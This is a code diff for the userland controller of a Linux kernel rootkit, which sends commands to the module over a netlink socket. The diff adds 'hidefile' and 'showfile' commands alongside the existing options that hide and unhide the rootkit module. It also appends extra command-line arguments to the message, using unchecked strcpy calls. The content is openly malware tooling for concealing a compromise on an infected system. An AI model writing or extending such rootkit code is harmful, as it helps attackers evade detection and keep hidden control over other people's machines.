@@ -14,18 +14,21 @@ static struct nlmsghdr * nlh = NULL;
 static struct iovec iov;
 static struct msghdr msg;
 static int sock;
+static unsigned long int length;
 
 static void exit_usage(const char * cmd) {
     printf("usage: %s [command]\n", cmd);
     printf("commands:\n");
     printf("  hidemodule - hides the rootkit from the system\n");
     printf("  showmodule - unhides the rootkit\n");
+    printf("  hidefile   - hides the file from the system\n");
+    printf("  showfile   - unhides the file\n");
     exit(EXIT_FAILURE);
 }
 
 int main(int argc, char *argv[]) {
     
-    if (argc != 2) {
+    if (argc < 2) {
         exit_usage(argv[0]);
     }
 
@@ -57,6 +60,16 @@ int main(int argc, char *argv[]) {
     nlh->nlmsg_pid = getpid();
     nlh->nlmsg_flags = 0;
     strcpy(NLMSG_DATA(nlh), argv[1]);
+
+    // append arguments
+    for (int i = 2; i < argc; i++) {
+        length = strlen(NLMSG_DATA(nlh));
+        strcpy(NLMSG_DATA(nlh)+length, " ");
+        strcpy(NLMSG_DATA(nlh)+length+1, argv[i]);
+    }
+
+    // print message
+    printf("%s\n", (char *)NLMSG_DATA(nlh));
 
     // wrap netlink packet in IO vector
     iov.iov_base = (void *)nlh;
